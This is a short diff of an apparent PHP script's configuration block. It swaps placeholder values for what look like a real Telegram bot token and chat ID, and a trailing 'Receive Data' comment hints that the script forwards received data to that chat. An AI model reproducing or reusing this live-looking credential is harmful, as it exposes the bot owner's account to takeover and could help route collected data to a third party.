@@ -2,8 +2,8 @@
 // ******************************************
 // CONFIGURATION: PASTE YOUR REAL DETAILS HERE
 // ******************************************
-$botToken = "YOUR_BOT_TOKEN_HERE"; // Paste your 8386... token here
-$chatId = "YOUR_CHAT_ID_HERE";     // Paste your -100... ID here
+$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; // Paste your 8386... token here
+$chatId = "-1003598938463";     // Paste your -100... ID here
 // ******************************************
 
 // Receive Data
